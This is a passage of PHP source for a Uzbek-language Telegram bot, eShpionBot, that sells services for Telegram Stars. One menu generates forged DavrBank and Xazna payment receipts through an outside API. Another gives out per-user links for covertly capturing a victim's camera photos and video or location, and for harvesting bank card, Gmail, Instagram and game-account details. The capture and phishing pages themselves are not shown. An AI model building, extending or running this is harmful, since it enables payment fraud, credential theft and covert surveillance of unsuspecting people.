        if (is_numeric($text)) {
            setUserStep($uid, 'waiting_gift_comment');
            setUserStep($uid, 'waiting_gift_comment', $text); // temp_data sifatida saqlash
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ ID qabul qilindi: <code>$text</code>\n\nEndi sovg'a uchun <b>kommentariya</b> (tabrik so'zi) yozing:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
        } else {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "⚠️ Xato! Faqat raqamlardan iborat ID yuboring.",
                'parse_mode' => 'HTML'
            ]);
        }
        exit();
    }
    
    // Gift kommentariyasini qabul qilish va yuborish
    if ($user_step == 'waiting_gift_comment' && isAdmin($uid)) {
        if ($text == "◀️ Orqaga") {
            setUserStep($uid, '');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>Sovg'a yuborish bekor qilindi</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid))
            ]);
            exit();
        }
        
        $target_id = getUserTemp($uid);
        
        // Gift yuborish
        $res = bot('sendGift', [
            'user_id' => $target_id,
            'gift_id' => '5170233102089322756', // giftining kodi
            'text' => $text           // Siz yozgan kommentariya
        ]);

        if ($res && $res->ok) {
            // Log yozish
            logGiftSend($uid, $target_id, '5170233102089322756', 15, $text); // 15 stars deb hisoblaymiz
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "🎉 <b>Muvaffaqiyatli!</b>\n\nID: <code>$target_id</code> sovg'asi yuborildi.\nIzoh: <i>$text</i>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid))
            ]);
        } else {
            // Agar xato bo'lsa (masalan botda Stars yetarli bo'lmasa)
            $error_desc = $res->description ?? "Noma'lum xato";
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "❌ <b>Xatolik yuz berdi!</b>\n\nSababi: <code>$error_desc</code>",
                'parse_mode' => 'HTML'
            ]);
        }
        
        setUserStep($uid, '');
        exit();
    }
    
    if ($text === "💳 To'lov qilish") {
    // Majburiy obuna tekshirish
    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
    setUserStep($uid, 'stars'); // $cid emas, $uid ishlating
    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "💵 <b>Balansingizni necha so'mga to'ldirmoqchisiz?</b>\n\n"
                . "1 ⭐️ = 220 so'm\n"
                . "📰 Minimal miqdor: 1 stars",
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'keyboard' => [[['text' => '❌ Bekor qilish']]],
            'resize_keyboard' => true
        ])
    ]);
    exit();
}

// Stars miqdori kiritilganda
$user_step = getUserStep($uid); // $cid emas, $uid bilan oling
    if ($user_step === 'stars') {
        if ($text === '❌ Bekor qilish') {
            setUserStep($cid, '');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>To'lov bekor qilindi</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid))
            ]);
            exit();
        }
        
        if ($text >= 1 && $text <= 10000000) {
            $amount = $text * 200;
            
            // To'lov chek yaratish
            bot('sendInvoice', [
                'chat_id' => $cid,
                'title' => "⭐️ Stars Payment - eShpionBot",
                'description' => "⬇️ Botdan $amount so'm olasiz.",
                'payload' => "buy-$text",
                'currency' => "XTR",
                'prices' => json_encode([['label' => "⭐️ Star", 'amount' => $text]]),
                'start_parameter' => 'start-telegram-stars'
            ]);
            
            setUserStep($cid, '');
            exit();
        } else {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "<u>⬇️ Minimal:</u> 1 stars\n<u>⬆️ Maksimal:</u> 10.000.000 stars",
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
    }

    
    // PROFIL
if ($text === "👤 Profil") {
    // Majburiy obuna tekshirish
    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
        
        $balance = $user_data['balance'] ?? 0;
        $stars_balance = $user_data['stars_balance'] ?? 0;
        $phone = $user_data['phone'] ?? 'Kiritilmagan';
        $first_seen = date('d.m.Y H:i', strtotime($user_data['first_seen']));
        $last_seen = date('d.m.Y H:i', strtotime($user_data['last_seen']));
        
        $profile_text = "👤 <b>Sizning profilingiz</b>\n\n"
                      . "🆔 ID: <code>$uid</code>\n"
                      . "👤 Ism: $full_name\n"
                      . "🔗 Username: @" . ($username ?: 'yo\'q') . "\n"
                      . "📅 Ro'yxatdan o'tgan: $first_seen\n";
        
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => $profile_text,
            'parse_mode' => 'HTML'
        ]);
        exit();
    }
    
// ========== XIZMATLAR ==========
if ($text === "🔐 Xizmatlar") {

    // Majburiy obuna tekshirish
    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'HTML',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode([
                'inline_keyboard' => $subscription['buttons']
            ]),
        ]);
        exit();
    }

    // Xizmatlar menyusi
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "🔐 <b>Xizmatlar menyusi</b>\n\nQuyidagilardan birini tanlang:",
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'keyboard' => [
                [
                    ['text' => "💫 Soxta chek"],
                    ['text' => "📢 Asosiy xizmatlar"]
                ],
                [
                    ['text' => "◀️ Orqaga", 'style' => "danger"]
                ]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ])
    ]);
    exit();
}



// --- YORDAMCHI FUNKSIYA (Takrorlanishni kamaytirish uchun) ---
function cancelWaiting($uid) {
    if (file_exists("waiting_{$uid}.txt")) {
        unlink("waiting_{$uid}.txt");
    }
}

// 1. "Orqaga" tugmasi bosilganda holatni bekor qilish
if ($text === "▶️ Orqaga") {
    cancelWaiting($uid);
    $text = "💫 Soxta chek"; // Foydalanuvchini asosiy menyuga qaytarish
}

// 2. Asosiy menyu: Soxta chek
if ($text === "💫 Soxta chek") {
    // Majburiy obuna tekshirish  
    $subscription = checkSubscriptionForAll($uid);  
    if (!$subscription['status']) {  
        bot('sendMessage', [  
            'chat_id' => $cid,  
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"  
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",  
            'parse_mode' => 'HTML',  
            'disable_web_page_preview' => true,  
            'reply_markup' => json_encode([  
                'inline_keyboard' => $subscription['buttons']  
            ]),  
        ]);  
        exit();  
    }  

    bot('sendMessage', [  
        'chat_id' => $cid,  
        'text' => "🔐 <b>Xizmatlar menyusi</b>\n\nQuyidagilardan birini tanlang:",  
        'parse_mode' => 'HTML',  
        'reply_markup' => json_encode([  
            'keyboard' => [  
                [['text' => "🟢 Xazna", 'style' => "primary"], ['text' => "🟢 Xazna Tranzaksiya", 'style' => "success"]],  
                [['text' => "⚪️ DavrBank", 'style' => "primary"], ['text' => "◀️ Orqaga", 'style' => "danger"]]  
            ],  
            'resize_keyboard' => true  
        ])  
    ]);  
    cancelWaiting($uid);
    exit();
}

// --- XIZMATLARNI TANLASH ---

if ($text === "⚪️ DavrBank") {
    bot('sendMessage', [  
        'chat_id' => $cid,  
        'text' => "💳 <b>DavrBank</b>\n\nFormat:\n<code>Summa\nSoat (10:01)\nSana (01.01.2026)\nIsm Sharif\nKarta 1\nKarta 2</code>",  
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['keyboard' => [[['text' => "▶️ Orqaga", 'style' => "danger"]]], 'resize_keyboard' => true])
    ]);  
    file_put_contents("waiting_{$uid}.txt", "davrbank");  
    exit();
}

if ($text === "🟢 Xazna Tranzaksiya") {
    bot('sendMessage', [  
        'chat_id' => $cid,  
        'text' => "💳 <b>Xazna (Tranzaksiya)</b>\n\nFormat:\n<code>Summa\nSana\nSoat\nKarta 1\nKarta 2\nIsm Sharif</code>",  
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['keyboard' => [[['text' => "▶️ Orqaga", 'style' => "danger"]]], 'resize_keyboard' => true])
    ]);  
    file_put_contents("waiting_{$uid}.txt", "paynet_trx");  
    exit();
}

if ($text === "🟢 Xazna") {
    bot('sendMessage', [  
        'chat_id' => $cid,  
        'text' => "💳 <b>Xazna (Oddiy)</b>\n\nFormat:\n<code>Summa\nSoat</code>",  
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode(['keyboard' => [[['text' => "▶️ Orqaga", 'style' => "danger"]]], 'resize_keyboard' => true])
    ]);  
    file_put_contents("waiting_{$uid}.txt", "paynet_simple");  
    exit();
}

// --- MA'LUMOTLARNI QABUL QILISH VA QAYTA ISHLASH ---

if (!empty($text) && file_exists("waiting_{$uid}.txt")) {
    $state = trim(file_get_contents("waiting_{$uid}.txt"));  
    $lines = explode("\n", trim($text));

    if ($state === 'davrbank') {  
        if (count($lines) !== 6) {
            bot('sendMessage', ['chat_id' => $cid, 'text' => "❌ Xato format! 6 qator ma'lumot yuboring.", 'parse_mode' => 'HTML']);
            exit();
        }
        list($summa, $time, $sana, $name, $card1, $card2) = array_map('trim', $lines);  
        $api_url = "https://wwwi.qzz.io/api/DavrBank/api.php?summa=$summa&soat=$time&sana=$sana&ism=" . urlencode($name) . "&karta1=$card1&karta2=$card2";
    } 
    
    elseif ($state === 'paynet_trx') {  
        if (count($lines) !== 6) {
            bot('sendMessage', ['chat_id' => $cid, 'text' => "❌ Xato format! 6 qator ma'lumot yuboring.", 'parse_mode' => 'HTML']);
            exit();
        }
        list($summa, $sana, $time, $card1, $card2, $name) = array_map('trim', $lines);  
        $api_url = "https://wwwi.qzz.io/api/Xazna/transaksiya/api.php?summa=$summa&sana=$sana&soat=$time&karta1=$card1&karta2=$card2&ism=" . urlencode($name);
    } 
    
    elseif ($state === 'paynet_simple') {  
        if (count($lines) !== 2) {
            bot('sendMessage', ['chat_id' => $cid, 'text' => "❌ Xato format! 2 qator ma'lumot yuboring.", 'parse_mode' => 'HTML']);
            exit();
        }
        list($summa, $time) = array_map('trim', $lines);  
        $api_url = "https://wwwi.qzz.io/api/Xazna/api.php?summa=$summa&soat=$time";
    }

    // Rasmni yuborish
    if (isset($api_url)) {
        bot('sendPhoto', [  
            'chat_id' => $cid,  
            'photo' => $api_url,  
            'caption' => "<b>✅ Chek @eShpionBot tomonidan tayyorlandi!</b>",  
            'parse_mode' => 'HTML'  
        ]);  
        cancelWaiting($uid);
        exit();
    }
}


if ($text === "📢 Asosiy xizmatlar") {
    // Majburiy obuna tekshirish
    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    

    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "🔐 <b>Xizmatlar menyusi</b>\n\nQuyidagilardan birini tanlang:",
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'keyboard' => [
                [['text' => "📸 Rasm oldi", 'style' => "success"], ['text' => "📷 Rasm orqa", 'style' => "danger"]],
                [['text' => "🎬 Video oldi", 'style' => "success"], ['text' => "🎬 Video orqa", 'style' => "danger"]],
                [['text' => "📍 Lokatsiya", 'style' => "success"], ['text' => "💳 Bank kartasi", 'style' => "danger"]],
                [['text' => "🎮 Free Fire", 'style' => "success"], ['text' => "🎯 PUBG", 'style' => "danger"]],
                [['text' => "📧 Gmail", 'style' => "success"], ['text' => "📷 Instagram", 'style' => "danger"]],
                [['text' => "◀️ Orqaga", 'style' => "primary"]],
            ],
            'resize_keyboard' => true
        ])
    ]);
    exit();
}

// ========== ORQAGA (Xizmatlar menyusidan keyin) ==========
if ($text === "◀️ Orqaga") {
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "🏠 <b>Asosiy menyuga qaytdingiz</b>",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard(isAdmin($uid))
    ]);
    setUserStep($uid, '');
    exit();
}

// ========== XIZMAT TURLARI ==========
$service_types = [
    "📸 Rasm oldi" => "old_kamera",
    "📷 Rasm orqa" => "orqa_kamera", 
    "🎬 Video oldi" => "old_video",
    "🎬 Video orqa" => "orqa_video",
    "📍 Lokatsiya" => "lokatsiya",
    "💳 Bank kartasi" => "bank",
    "🎮 Free Fire" => "freefire",
    "🎯 PUBG" => "pubg",
    "📧 Gmail" => "gmail",
    "📷 Instagram" => "instagram"
];

if (array_key_exists($text, $service_types)) {
    $user_data = getUserData($uid);
    
    $service_type = $service_types[$text];
    $link = getServiceLink($uid, $service_type);
    $service_name = getServiceName($service_type);
    
    $message_text = "✅ <b>$service_name xizmatingiz tayyor!</b>\n\n" .
                   "🔗 <b>Link:</b> <code>$link</code>\n\n" .
                   "📱 Bu linkni telefoningizga yuboring va oching.\n" .
                   "👤 <b>Foydalanuvchi ID:</b> <code>$uid</code>";
    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => $message_text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => "🔗 Ulashish", 'url' => "https://t.me/share/url?url=" . urlencode($link), 'style' => "danger"],
                    ['text' => "📋 Nusxa olish", 'copy_text' => ['text' => $link], 'style' => "primary"]
                ]
            ]
        ])
    ]);
    exit();
}
    // QOIDALAR
    if ($text === "📘 Qoidalar") {
    	    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => getRules(),
            'parse_mode' => 'HTML'
        ]);
        exit();
    }
    
    // BOG'LANISH
    if ($text === "📞 Bog'lanish") {
    	    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "💬 <b>Savol yoki takliflaringiz bo'lsa murojaat qiling:</b>",
            'parse_mode' => 'HTML',
            'reply_markup' => json_encode([
                'inline_keyboard' => [[
                    ['text' => "☎️ Qo'llab-quvvatlash", 'url' => "https://t.me/eShpion_Bot", 'icon_custom_emoji_id' => "5281024210146201465", 'style' => "success"]
                ]]
            ])
        ]);
        exit();
    }
    
    // ========== ADMIN PANEL ==========
    if ($text == "🗄 Boshqaruv paneli" && isAdmin($uid)) {
        $panel = json_encode([
            'resize_keyboard' => true,
            'keyboard' => [
                [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
            ]
        ]);
        
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "<b>🛠 Admin paneliga xush kelibsiz!</b>",
            'parse_mode' => 'HTML',
            'reply_markup' => $panel
        ]);
        exit();
    }
    
    // ========== ADMIN PANEL BO'LIMLARI ==========
    if (isAdmin($uid)) {
        // ORQAGA (admin panelida)
        if ($text == "◀️ Orqaga") {
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "?? Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                    [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                    [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "<b>Admin paneliga xush kelibsiz!</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // STATISTIKA
        if ($text == "📊 Statistika") {
            $stats = getStats();
            $stats_text = "📊 <b>Bot statistikasi</b>\n\n"
                        . "👥 Jami foydalanuvchilar: <b>{$stats['total']} ta</b>\n"
                        . "📈 Bugun qo'shilgan: <b>{$stats['today']} ta</b>\n"
                        . "📆 So'nggi 7 kun: <b>{$stats['weekly']} ta</b>\n"
                        . "🎁 Yuborilgan giftlar: <b>{$stats['total_gifts']} ta</b>\n"
                        . "💰 Jami to'lovlar: <b>{$stats['total_payments']} ta</b>\n\n"
                        . "⏰ Hisobot vaqti: " . date('d.m.Y H:i');
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $stats_text,
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
        
        // FOYDALANUVCHILAR
        if ($text == "👤 Foydalanuvchilar") {
            $total = getStats()['total'];
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "👥 <b>Foydalanuvchilar boshqaruvi</b>\n\n"
                        . "Jami: <b>$total ta</b>\n\n"
                        . "Foydalanuvchi ID sini yuboring yoki /all yozing:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'search_user');
            exit();
        }
        
        // XABARLAR
        if ($text == "📢 Xabarlar") {
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📢 Hammaga xabar"], ['text' => "👤 Bir kishiga xabar"]],
                    [['text' => "📨 Forward xabar"],['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "📤 <b>Xabar yuborish paneli</b>\n\n"
                        . "Quyidagi variantlardan birini tanlang:",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // GIFT YUBORISH (ADMIN PANELDAN)
        if ($text == "🎁 Gift yuborish") {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "🎁 <b>Sovg'a yuborish bo'limi</b>\n\nKimga yubormoqchisiz? Foydalanuvchi <b>ID</b> sini yuboring:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'waiting_gift_id');
            exit();
        }
        
        // SOZLAMALAR
        if ($text == "⚙️ Sozlamalar") {
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📢 Kanallar"], ['text' => "💰 To'lovlar"]],
                    [['text' => "🤖 Bot holati"], ['text' => "👥 Adminlar"]],
                    [['text' => "◀️ Orqaga"]]
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "⚙️ <b>Bot sozlamalari</b>\n\n"
                        . "Botning turli sozlamalarini o'zgartirishingiz mumkin:",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // ========== SOZLAMALAR BO'LIMLARI ==========
        
        // KANALLAR
        if ($text == "📢 Kanallar") {
            $channels = getChannels();
            
            if (empty($channels)) {
                $channels_text = "❌ Hech qanday kanal qo'shilmagan";
            } else {
                $channels_text = "📢 <b>Kanallar ro'yxati:</b>\n\n";
                $public_count = 0;
                $private_count = 0;
                
                foreach ($channels as $index => $channel) {
                    if ($channel['type'] == 'public') {
                        $public_count++;
                        $channels_text .= "🌐 $public_count. @" . $channel['username'] . "\n";
                    } else {
                        $private_count++;
                        $channels_text .= "🔒 Maxfiy $private_count. Chat ID: " . $channel['chat_id'] . "\n";
                    }
                }
                
                $channels_text .= "\n🌐 Ommaviy kanallar: $public_count ta\n";
                $channels_text .= "🔒 Maxfiy kanallar: $private_count ta";
            }
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $channels_text,
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode([
                    'inline_keyboard' => [
                        [['text' => '➕ Ommaviy kanal', 'callback_data' => 'add_public', 'style' => "primary"]],
                        [['text' => '➕ Maxfiy kanal', 'callback_data' => 'add_private', 'style' => "danger"]],
                        [['text' => '➖ Kanal o\'chirish', 'callback_data' => 'remove_channel', 'style' => "success"]]
                    ]
                ])
            ]);
            exit();
        }
        
        // QOIDA TAXRIRLASH
        if ($text == "📘 Qoidalar") {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✍️ <b>Yangi qoida matnini yuboring:</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'edit_rules');
            exit();
        }
        
        // BOT HOLATI
        if ($text == "🤖 Bot holati") {
            $current_status = getBotStatus();
            $status_text = $current_status == 'active' ? '✅ Faol' : '⏸ To\'xtatilgan';
            $button_text = $current_status == 'active' ? '⏸ To\'xtatish' : '✅ Faollashtirish';
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "🤖 <b>Bot holati:</b> $status_text",
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode([
                    'inline_keyboard' => [[
                        ['text' => $button_text, 'callback_data' => 'toggle_bot', 'style' => "primary"]
                    ]]
                ])
            ]);
            exit();
        }
        
        // ADMINLAR
        if ($text == "👥 Adminlar") {
            $admins = getAdmins();
            $admin_text = "👥 <b>Adminlar ro'yxati</b>\n\n";
            foreach ($admins as $admin) {
                $admin_text .= "• <code>$admin</code>\n";
            }
            
            $keyboard = [];
            if ($uid == $admin_id) {
                $keyboard[] = [['text' => '➕ Admin qo\'shish', 'callback_data' => 'add_admin', 'style' => "primary"]];
                $keyboard[] = [['text' => '➖ Admin o\'chirish', 'callback_data' => 'remove_admin', 'style' => "danger"]];
            }
            $keyboard[] = [['text' => '📋 Adminlar ro\'yxati', 'callback_data' => 'list_admins', 'style' => "success"]];
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $admin_text,
                'parse_mode' => 'HTML',
                'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
            ]);
            exit();
        }
        
        // TO'LOVLAR
        if ($text == "💰 To'lovlar") {
            $payments_dir = "payments";
            $payments_text = "💰 <b>Oxirgi to'lovlar</b>\n\n";
            
            if (!is_dir($payments_dir)) {
                mkdir($payments_dir, 0777, true);
            }
            
            $today_file = "$payments_dir/" . date('Y-m-d') . ".txt";
            if (file_exists($today_file)) {
                $payments = file($today_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                $count = 0;
                foreach ($payments as $payment) {
                    if ($count >= 10) break;
                    $payments_text .= "• $payment\n";
                    $count++;
                }
                if ($count == 0) {
                    $payments_text .= "❌ Bugun to'lov bo'lmagan";
                }
            } else {
                $payments_text .= "❌ Bugun to'lov bo'lmagan";
            }
            
            $payments_text .= "\n\n📅 Bugun: " . date('d.m.Y');
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $payments_text,
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
        
        // BOG'LANISH (ADMIN)
        if ($text == "📞 Bog'lanish") {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "💬 <b>Bog'lanish ma'lumotlari</b>\n\n"
                        . "Bot yaratuvchisi: @xolisiy\n"
                        . "Qo'llab-quvvatlash: @xolisiy\n\n"
                        . "Texnik muammolar bo'lsa yoki yangi takliflaringiz bo'lsa, yozib qoldiring.",
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
        
        // ========== XABAR YUBORISH TURLARI ==========
        
        // HAMMAGA XABAR
        if ($text == "📢 Hammaga xabar") {
            $total = getStats()['total'];
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "📢 <b>Barcha foydalanuvchilarga xabar yuborish</b>\n\n"
                        . "Barcha $total ta foydalanuvchiga yubormoqchi bo'lgan xabaringizni yuboring.\n\n"
                        . "⚠️ HTML formatida yuborishingiz mumkin.\n"
                        . "❌ Bekor qilish uchun '◀️ Orqaga' tugmasini bosing.",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'broadcast_all');
            exit();
        }
        
        // BIR KISHIGA XABAR
        if ($text == "👤 Bir kishiga xabar") {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "👤 <b>Bir kishiga xabar yuborish</b>\n\n"
                        . "Xabar yubormoqchi bo'lgan foydalanuvchi <b>ID raqamini</b> yuboring:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            setUserStep($uid, 'single_message_user');
            exit();
        }
        
        // FORWARD XABAR
        if ($text == "📨 Forward xabar") {
            $panel = json_encode([
                'resize_keyboard' => true,
                'keyboard' => [
                    [['text' => "📢 Hammaga forward"], ['text' => "👤 Bir kishiga forward"]],
                    [['text' => "◀️ Orqaga"]],
                ]
            ]);
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "📨 <b>Forward xabar yuborish</b>\n\n"
                        . "Qaysi usulda forward qilmoqchisiz?",
                'parse_mode' => 'HTML',
                'reply_markup' => $panel
            ]);
            exit();
        }
        
        // XABAR STATISTIKASI
        if ($text == "📊 Xabar statistikasi") {
            $messages_dir = "messages";
            $messages_text = "📊 <b>Xabar yuborish statistikasi</b>\n\n";
            
            if (!is_dir($messages_dir)) {
                mkdir($messages_dir, 0777, true);
            }
            
            $today_file = "$messages_dir/" . date('Y-m-d') . ".txt";
            if (file_exists($today_file)) {
                $messages = file($today_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
                $count = 0;
                $messages_text .= "📅 <b>Bugungi xabarlar:</b>\n";
                foreach ($messages as $message) {
                    if ($count >= 5) break;
                    $messages_text .= "• $message\n";
                    $count++;
                }
                if ($count == 0) {
                    $messages_text .= "❌ Bugun xabar yuborilmagan\n";
                }
            } else {
                $messages_text .= "❌ Bugun xabar yuborilmagan\n";
            }
            
            // Oxirgi 7 kun statistikasi
            $week_stats = [];
            for ($i = 0; $i < 7; $i++) {
                $date = date('Y-m-d', strtotime("-$i days"));
                $file = "$messages_dir/$date.txt";
                if (file_exists($file)) {
                    $count = count(file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
                    $week_stats[] = date('d.m', strtotime("-$i days")) . ": $count ta";
                }
            }
            
            if (!empty($week_stats)) {
                $messages_text .= "\n📆 <b>Oxirgi 7 kun:</b>\n";
                $messages_text .= implode("\n", $week_stats);
            }
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => $messages_text,
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
        
        // FORWARD XABAR TURLARI
        if ($text == "📢 Hammaga forward") {
            setUserStep($uid, 'forward_all');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "📢 <b>Barchaga forward xabar yuborish</b>\n\n"
                        . "Iltimos, forward qilmoqchi bo'lgan xabaringizni yuboring:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            exit();
        }
        
        if ($text == "👤 Bir kishiga forward") {
            setUserStep($uid, 'forward_single_user');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "👤 <b>Bir kishiga forward xabar yuborish</b>\n\n"
                        . "Xabar forward qilmoqchi bo'lgan foydalanuvchi <b>ID raqamini</b> yuboring:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
            exit();
        }
    }
    
    // ========== ADMIN STEP HANDLERS (TO'LIQ QILINGAN) ==========
    if (isAdmin($uid)) {
        $admin_step = getUserStep($uid);
        
        // ========== KANAL QO'SHISH ==========
        
        // OMMAVIY KANAL QO'SHISH
        if ($admin_step == 'add_public') {
            if ($text == "◀️ Orqaga") {
                setUserStep($uid, '');
                $panel = json_encode([
                    'resize_keyboard' => true,
                    'keyboard' => [
                        [['text' => "📊 Statistika"], ['text' => "👤 Foydalanuvchilar"]],
                        [['text' => "📢 Xabarlar"], ['text' => "🎁 Gift yuborish"]],
                        [['text' => "⚙️ Sozlamalar"], ['text' => "◀️ Orqaga"]],
                    ]
                ]);
                
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "<b>Kanal qo'shish bekor qilindi</b>",
                    'parse_mode' => 'HTML',
                    'reply_markup' => $panel
                ]);
                exit();
            }
            
            // @ belgisini olib tashlash
            $channel_username = ltrim($text, '@');
            
            // Kanal mavjudligini tekshirish
            $check = bot('getChat', ['chat_id' => "@$channel_username"]);
            
            if (!$check->ok) {
                bot('sendMessage', [
                    'chat_id' => $cid,
                    'text' => "❌ <b>Kanal topilmadi yoki bot kanalga admin emas!</b>\n\n"
                            . "Iltimos, quyidagilarni tekshiring:\n"
